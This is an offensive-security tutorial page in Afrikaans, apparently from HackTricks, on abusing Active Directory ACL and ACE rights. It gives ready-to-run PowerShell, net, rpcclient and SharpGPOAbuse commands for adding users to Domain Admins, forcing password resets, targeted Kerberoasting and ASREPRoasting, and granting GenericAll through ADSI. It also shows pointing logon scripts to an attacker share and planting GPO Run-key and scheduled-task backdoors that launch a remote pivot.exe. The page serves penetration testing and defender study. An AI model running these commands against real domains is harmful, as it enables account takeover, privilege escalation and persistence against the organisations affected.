# Misbruik van Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Hierdie bladsy is meestal 'n opsomming van die tegnieke van** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **en** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Vir meer besonderhede, kyk na die oorspronklike artikels.**

## **GenericAll Regte op Gebruiker**

Hierdie voorreg verleen 'n aanvaller volle beheer oor 'n teiken gebruikersrekening. Sodra `GenericAll` regte bevestig is met die `Get-ObjectAcl` opdrag, kan 'n aanvaller:

- **Verander die Teiken se Wagwoord**: Met `net user <username> <password> /domain` kan die aanvaller die gebruiker se wagwoord reset.
- **Teiken Kerberoasting**: Ken 'n SPN aan die gebruiker se rekening toe om dit kerberoastable te maak, en gebruik dan Rubeus en targetedKerberoast.py om die ticket-granting ticket (TGT) hashes te onttrek en te probeer kraak.
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Teiken ASREPRoasting**: Deaktiveer vooraf-sertifisering vir die gebruiker, wat hul rekening kwesbaar maak vir ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Regte op Groep**

Hierdie voorreg laat 'n aanvaller toe om groep lidmaatskappe te manipuleer as hulle `GenericAll` regte op 'n groep soos `Domain Admins` het. Nadat die aanvaller die groep se onderskeidende naam met `Get-NetGroup` geïdentifiseer het, kan hulle:

- **Hulself by die Domain Admins Groep Voeg**: Dit kan gedoen word deur direkte opdragte of deur modules soos Active Directory of PowerSploit te gebruik.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Die hou van hierdie regte op 'n rekenaar objek of 'n gebruikersrekening stel in staat tot:

- **Kerberos Resource-based Constrained Delegation**: Maak dit moontlik om 'n rekenaar objek oor te neem.
- **Shadow Credentials**: Gebruik hierdie tegniek om 'n rekenaar of gebruikersrekening na te volg deur die regte te benut om skadu kredensiale te skep.

## **WriteProperty on Group**

As 'n gebruiker `WriteProperty` regte op alle objekte vir 'n spesifieke groep (bv. `Domain Admins`) het, kan hulle:

- **Hulself by die Domain Admins Groep Voeg**: Bereikbaar deur `net user` en `Add-NetGroupUser` opdragte te kombineer, maak hierdie metode regte eskalasie binne die domein moontlik.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) op Groep**

Hierdie voorreg stel aanvallers in staat om hulself by spesifieke groepe, soos `Domain Admins`, te voeg deur opdragte wat groep lidmaatskap direk manipuleer. Deur die volgende opdragte volgorde te gebruik, kan self-voeging gedoen word:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

'n Soortgelyke voorreg, dit laat aanvallers toe om hulself direk by groepe te voeg deur groep eienskappe te wysig as hulle die `WriteProperty` reg op daardie groepe het. Die bevestiging en uitvoering van hierdie voorreg word uitgevoer met:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Die hou van die `ExtendedRight` op 'n gebruiker vir `User-Force-Change-Password` laat wagwoordherstel toe sonder om die huidige wagwoord te ken. Verifikasie van hierdie reg en die benutting daarvan kan gedoen word deur PowerShell of alternatiewe opdraglyn gereedskap, wat verskeie metodes bied om 'n gebruiker se wagwoord te herstel, insluitend interaktiewe sessies en een-liners vir nie-interaktiewe omgewings. Die opdragte wissel van eenvoudige PowerShell-aanroepe tot die gebruik van `rpcclient` op Linux, wat die veelsydigheid van aanvalsvektore demonstreer.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner op Groep**

As 'n aanvaller vind dat hulle `WriteOwner` regte oor 'n groep het, kan hulle die eienaarskap van die groep na hulself verander. Dit is veral impakvol wanneer die groep in vraag `Domain Admins` is, aangesien die verandering van eienaarskap breër beheer oor groepattributen en lidmaatskap toelaat. Die proses behels die identifisering van die korrekte objek via `Get-ObjectAcl` en dan die gebruik van `Set-DomainObjectOwner` om die eienaar te wysig, hetsy deur SID of naam.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite op Gebruiker**

Hierdie toestemming laat 'n aanvaller toe om gebruiker eienskappe te wysig. Spesifiek, met `GenericWrite` toegang, kan die aanvaller die aanmeldskrip pad van 'n gebruiker verander om 'n kwaadwillige skrip uit te voer tydens gebruiker aanmelding. Dit word bereik deur die `Set-ADObject` opdrag te gebruik om die `scriptpath` eienskap van die teiken gebruiker op te dateer om na die aanvaller se skrip te verwys.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite op Groep**

Met hierdie voorreg kan aanvallers groepslidmaatskap manipuleer, soos om hulself of ander gebruikers by spesifieke groepe te voeg. Hierdie proses behels die skep van 'n geloofsbrief objek, dit gebruik om gebruikers by 'n groep te voeg of te verwyder, en die lidmaatskap veranderinge met PowerShell-opdragte te verifieer.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Die besit van 'n AD objek en die hê van `WriteDACL` regte daarop stel 'n aanvaller in staat om vir hulself `GenericAll` regte oor die objek toe te ken. Dit word bereik deur ADSI manipulasie, wat volle beheer oor die objek toelaat en die vermoë om sy groep lidmaatskappe te wysig. Ten spyte hiervan, bestaan daar beperkings wanneer daar probeer word om hierdie regte te benut met die Active Directory module se `Set-Acl` / `Get-Acl` cmdlets.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replika op die Domein (DCSync)**

Die DCSync-aanval benut spesifieke replika-regte op die domein om 'n Domeinbeheerder na te boots en data te sinkroniseer, insluitend gebruikersbewyse. Hierdie kragtige tegniek vereis regte soos `DS-Replication-Get-Changes`, wat aanvallers in staat stel om sensitiewe inligting uit die AD-omgewing te onttrek sonder direkte toegang tot 'n Domeinbeheerder. [**Leer meer oor die DCSync-aanval hier.**](../dcsync.md)

## GPO-delegasie <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO-delegasie

Gedelegeerde toegang om Groep Beleidsobjekte (GPO's) te bestuur kan beduidende sekuriteitsrisiko's inhou. Byvoorbeeld, as 'n gebruiker soos `offense\spotless` GPO-bestuursregte gedelegeer word, kan hulle regte hê soos **WriteProperty**, **WriteDacl**, en **WriteOwner**. Hierdie regte kan misbruik word vir kwaadwillige doeleindes, soos geïdentifiseer met PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO-regte op te som

Om verkeerd geconfigureerde GPO's te identifiseer, kan PowerSploit se cmdlets saamgeketting word. Dit stel in staat om GPO's te ontdek waarvoor 'n spesifieke gebruiker regte het om te bestuur: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Rekenaars met 'n Gegewe Beleid Toegepas**: Dit is moontlik om te bepaal watter rekenaars 'n spesifieke GPO toegepas is, wat help om die omvang van potensiële impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Beleide Toegepas op 'n Gegewe Rekenaar**: Om te sien watter beleide op 'n spesifieke rekenaar toegepas is, kan opdragte soos `Get-DomainGPO` gebruik word.

**OUs met 'n Gegewe Beleid Toegepas**: Om organisatoriese eenhede (OUs) te identifiseer wat deur 'n gegewe beleid geraak word, kan `Get-DomainOU` gebruik word.

### Misbruik GPO - New-GPOImmediateTask

Verkeerd geconfigureerde GPO's kan benut word om kode uit te voer, byvoorbeeld, deur 'n onmiddellike geskeduleerde taak te skep. Dit kan gedoen word om 'n gebruiker by die plaaslike administrateursgroep op geraakte masjiene te voeg, wat regte beduidend verhoog:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Misbruik GPO

Die GroupPolicy module, indien geïnstalleer, maak die skep en koppel van nuwe GPO's moontlik, en stel voorkeure soos registerwaardes in om backdoors op die geraakte rekenaars uit te voer. Hierdie metode vereis dat die GPO opgedateer word en 'n gebruiker moet aanmeld op die rekenaar vir uitvoering:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Misbruik GPO

SharpGPOAbuse bied 'n metode om bestaande GPO's te misbruik deur take by te voeg of instellings te wysig sonder die behoefte om nuwe GPO's te skep. Hierdie hulpmiddel vereis die wysiging van bestaande GPO's of die gebruik van RSAT-hulpmiddels om nuwe te skep voordat veranderinge toegepas word:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO-opdaterings gebeur tipies elke 90 minute. Om hierdie proses te versnel, veral na die implementering van 'n verandering, kan die `gpupdate /force` opdrag op die teikenrekenaar gebruik word om 'n onmiddellike beleidsopdatering af te dwing. Hierdie opdrag verseker dat enige wysigings aan GPO's toegepas word sonder om te wag vir die volgende outomatiese opdateringsiklus.

### Under the Hood

By die inspeksie van die Geskeduleerde Take vir 'n gegewe GPO, soos die `Misconfigured Policy`, kan die toevoeging van take soos `evilTask` bevestig word. Hierdie take word geskep deur middel van skripte of opdraglyn gereedskap wat daarop gemik is om stelsels gedrag te verander of bevoegdhede te verhoog.

Die struktuur van die taak, soos getoon in die XML-konfigurasie lêer wat deur `New-GPOImmediateTask` gegenereer is, skets die spesifieke van die geskeduleerde taak - insluitend die opdrag wat uitgevoer moet word en sy triggers. Hierdie lêer verteenwoordig hoe geskeduleerde take gedefinieer en bestuur word binne GPO's, wat 'n metode bied om arbitrêre opdragte of skripte as deel van beleidsafdwinging uit te voer.

### Users and Groups

GPO's laat ook die manipulasie van gebruikers- en groep lidmaatskappe op teikenstelsels toe. Deur die Gebruikers- en Groep beleidslêers direk te redigeer, kan aanvallers gebruikers aan bevoorregte groepe, soos die plaaslike `administrators` groep, toevoeg. Dit is moontlik deur die delegasie van GPO bestuur toestemming, wat die wysiging van beleidslêers toelaat om nuwe gebruikers in te sluit of groep lidmaatskappe te verander.

Die XML-konfigurasie lêer vir Gebruikers en Groepe skets hoe hierdie veranderinge geïmplementeer word. Deur inskrywings aan hierdie lêer toe te voeg, kan spesifieke gebruikers verhoogde bevoegdhede oor geraakte stelsels verleen word. Hierdie metode bied 'n direkte benadering tot bevoegdheid verhoging deur GPO manipulasie.

Verder kan addisionele metodes vir die uitvoering van kode of die handhawing van volharding, soos die benutting van aanmeld/afmeld skripte, die wysiging van registriesleutels vir autoruns, die installering van sagteware via .msi lêers, of die redigering van dienskonfigurasies, ook oorweeg word. Hierdie tegnieke bied verskeie roetes om toegang te handhaaf en teikenstelsels te beheer deur die misbruik van GPO's.

## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
